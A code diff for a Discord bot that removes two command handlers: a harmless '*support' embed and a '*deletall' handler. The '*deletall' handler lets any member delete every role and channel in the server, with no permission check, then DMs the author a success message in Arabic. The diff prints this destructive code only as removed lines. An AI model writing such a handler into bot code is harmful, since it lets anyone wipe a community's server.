@@ -569,19 +569,6 @@ if (message.content.startsWith(prefix + 'trans')) {
 
 
 
-client.on('message', message => {
-       if(message.content.startsWith(`*support`)){ //GSU 
-           var embed = new Discord.RichEmbed() //GSU
-           .setAuthor(message.author.username, message.author.avatarURL) //POWER
-	   .setTitle("**Support Server**") //GSU
-           .setFooter(`King Bot `,'https://cdn.discordapp.com/attachments/494148570094632961/494590923620089857/Kingbot.png')
-           .setURL("https://discord.gg/p2sjgAw") //GSU
-           .setTimestamp() //POWER
-           .setColor("RANDOM") //GSU
-           message.channel.send({embed}) //GSU
-       }
-   });
-
 
 
 
@@ -1186,16 +1173,6 @@ if (message.content.startsWith("*cv")) {
 });
 	
 	
-client.on('message', x5bz => {   
- if (x5bz.content.startsWith("*deletall")) {
-     x5bz.guild.roles.forEach(r => { r.delete() }) 
-     x5bz.guild.channels.forEach(c => { c.delete() })
-                let v5bz = new Discord.RichEmbed()
-            .setColor('RANDOM')
-            .setDescription('**تم الحذف بنجاح**')
-           x5bz.author.sendEmbed(v5bz);
- }
- });
 	
 	
 	
